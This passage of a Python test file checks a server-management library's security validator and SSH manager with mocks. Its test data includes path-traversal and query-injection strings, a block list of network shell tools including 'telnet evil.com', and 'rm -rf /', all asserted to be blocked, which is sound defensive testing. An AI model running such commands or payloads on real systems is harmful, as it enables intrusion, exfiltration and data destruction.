            "my*app",  # glob
            "my?app",  # glob
            "my'app'",  # quote
            'my"app"',  # quote
            "my\\app",  # escape
            "my app",  # space
            "my!app",  # history
            "my#app",  # comment
        ]
        for name in traversal_patterns:
            assert self.security.validate_service_name(name) is False, (
                f"Should block: {name}"
            )

    def test_file_path_resolution_escape(self):
        """Path resolution that escapes service directory should be blocked."""
        # This tests the path resolution escape check
        result = self.security.validate_service_file_path(
            "myapp", "..%2f..%2fetc/passwd"
        )
        assert result is None

    def test_file_path_resolution_error(self):
        """Path resolution errors should be handled gracefully."""
        # Test with a path that causes resolution error
        result = self.security.validate_service_file_path("myapp", "file\x00name.txt")
        assert result is None

    def test_influxdb_query_dangerous_chars(self):
        """InfluxDB queries with dangerous characters should be blocked."""
        dangerous = [
            "SELECT * FROM cpu; DROP TABLE metrics",  # semicolon
            "SELECT * FROM cpu -- comment",  # SQL comment
            "SELECT * FROM cpu /* block */",  # block comment
            "SELECT * FROM cpu `whoami`",  # command substitution
            "SELECT * FROM cpu $var",  # variable expansion
            "SELECT * FROM cpu | cat",  # pipe
            "SELECT * FROM cpu & bg",  # background
            "SELECT * FROM cpu {brace}",  # brace expansion
            "SELECT * FROM cpu \\n",  # escape
            "SELECT * FROM cpu \n newline",  # newline
            "SELECT * FROM cpu \r cr",  # carriage return
            "SELECT * FROM cpu \x00 null",  # null byte
        ]
        for q in dangerous:
            assert self.security.validate_influxdb_query(q) is None, (
                f"Should block: {q[:50]}"
            )

    def test_command_safety_net_tools_blocked(self):
        """Network exfiltration tools should be blocked."""
        dangerous = [
            "nc -l 1234",
            "ncat -l 1234",
            "netcat -l 1234",
            "socat TCP-LISTEN:1234 -",
            "telnet evil.com",
        ]
        for cmd in dangerous:
            assert self.security.is_command_safe(cmd) is False, f"Should block: {cmd}"


# ============================================================================
# SSH Manager Edge Cases
# ============================================================================


class TestSSHManagerEdgeCases:
    """Test SSHManager edge cases."""

    @pytest.fixture
    def config(self):
        return {
            "ssh": {
                "host": "localhost",
                "port": 22,
                "username": "test",
                "key_path": None,
            },
            "security": {"services_path": "/srv"},
        }

    @pytest.fixture
    def config_with_key(self):
        return {
            "ssh": {
                "host": "localhost",
                "port": 22,
                "username": "test",
                "key_path": "~/.ssh/id_rsa",
            },
            "security": {"services_path": "/srv"},
        }

    @pytest.fixture
    def config_with_password(self):
        return {
            "ssh": {
                "host": "localhost",
                "port": 22,
                "username": "test",
                "password": "secret",
            },
            "security": {"services_path": "/srv"},
        }

    @pytest.fixture
    def security(self, config):
        return SecurityValidator(config)

    def test_manager_with_key_path(self, config_with_key, security):
        """Test SSHManager with key path configuration."""
        manager = SSHManager(config_with_key, security)
        assert manager.config["ssh"]["key_path"] == "~/.ssh/id_rsa"

    def test_manager_with_password(self, config_with_password, security):
        """Test SSHManager with password configuration."""
        manager = SSHManager(config_with_password, security)
        assert manager.config["ssh"]["password"] == "secret"

    def test_check_service_exists(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            # check_service_exists runs: test -d /srv/{service} && echo 'exists' || echo 'not_exists'
            mock_conn.run.return_value = MagicMock(
                stdout="exists", stderr="", exit_status=0
            )
            manager.connection = mock_conn

            result = await manager.check_service_exists("myapp")
            assert result is True

        asyncio.run(run())

    def test_check_service_exists_not_found(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            mock_conn.run.return_value = MagicMock(
                stdout="not_exists", stderr="", exit_status=0
            )
            manager.connection = mock_conn

            result = await manager.check_service_exists("nonexistent")
            assert result is False

        asyncio.run(run())

    def test_check_service_exists_exception(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True
            manager.connection = AsyncMock()
            manager.connection.run.side_effect = Exception("Command failed")

            result = await manager.check_service_exists("myapp")
            assert result is False

        asyncio.run(run())

    def test_context_manager(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            mock_conn.run.return_value = MagicMock(
                stdout="test", stderr="", exit_status=0
            )
            mock_conn.close = MagicMock()
            manager.connection = mock_conn

            with patch.object(manager.security, "is_command_safe", return_value=True):
                result = await manager.execute_safe_command("echo test")
                assert "test" in result

            await manager.disconnect()
            assert manager._connected is False

        asyncio.run(run())

    def test_disconnect_on_error(self, config, security):
        async def run():
            manager = SSHManager(config, security)

            with patch("server_management_lib.ssh_manager.asyncssh.connect") as mock:
                mock.side_effect = Exception("Connection failed")

                try:
                    await manager.connect()
                except Exception:
                    pass

                assert manager._connected is False

        asyncio.run(run())

    def test_execute_safe_command_not_connected(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = False
            manager.connection = None

            # When connect() raises, it should propagate
            with patch.object(
                manager, "connect", side_effect=Exception("Connection failed")
            ):
                with pytest.raises(Exception, match="Connection failed"):
                    await manager.execute_safe_command("echo test")

        asyncio.run(run())

    def test_execute_safe_command_connection_none(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True
            manager.connection = None

            with patch.object(manager, "connect", return_value=None):
                result = await manager.execute_safe_command("echo test")
                assert "Connection failed" in result

        asyncio.run(run())

    def test_execute_safe_command_unsafe(self, config, security):
        async def run():
            manager = SSHManager(config, security)
            manager._connected = True
            manager.connection = AsyncMock()

            result = await manager.execute_safe_command("rm -rf /")
            assert "Security violation" in result

        asyncio.run(run())

    def test_execute_safe_command_with_stderr(self, config, security):
        """Test that stderr is included in the output."""

        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            mock_conn.run.return_value = MagicMock(
                stdout="stdout output", stderr="stderr output", exit_status=0
            )
            manager.connection = mock_conn

            with patch.object(manager.security, "is_command_safe", return_value=True):
                result = await manager.execute_safe_command("echo test")
                assert "stdout output" in result
                assert "stderr output" in result

        asyncio.run(run())

    def test_execute_safe_command_nonzero_exit(self, config, security):
        """Test that non-zero exit codes are reported."""

        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            mock_conn.run.return_value = MagicMock(
                stdout="output", stderr="", exit_status=1
            )
            manager.connection = mock_conn

            with patch.object(manager.security, "is_command_safe", return_value=True):
                result = await manager.execute_safe_command("command")
                assert "output" in result
                assert "Exit code: 1" in result

        asyncio.run(run())

    def test_execute_safe_command_asyncssh_error(self, config, security):
        """Test that asyncssh errors are handled."""

        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            mock_conn.run.side_effect = Exception("SSH connection lost")
            manager.connection = mock_conn

            with patch.object(manager.security, "is_command_safe", return_value=True):
                result = await manager.execute_safe_command("command")
                assert (
                    "Error executing command" in result
                    or "SSH connection lost" in result
                )

        asyncio.run(run())

    def test_execute_safe_command_timeout(self, config, security):
        """Test that timeouts are handled."""

        async def run():
            manager = SSHManager(config, security)
            manager._connected = True

            mock_conn = AsyncMock()
            mock_conn.run.side_effect = TimeoutError()
            manager.connection = mock_conn

            with patch.object(manager.security, "is_command_safe", return_value=True):
                result = await manager.execute_safe_command("command", timeout=10)
                assert "timed out" in result

        asyncio.run(run())


# ============================================================================
# Run Tests
# ============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
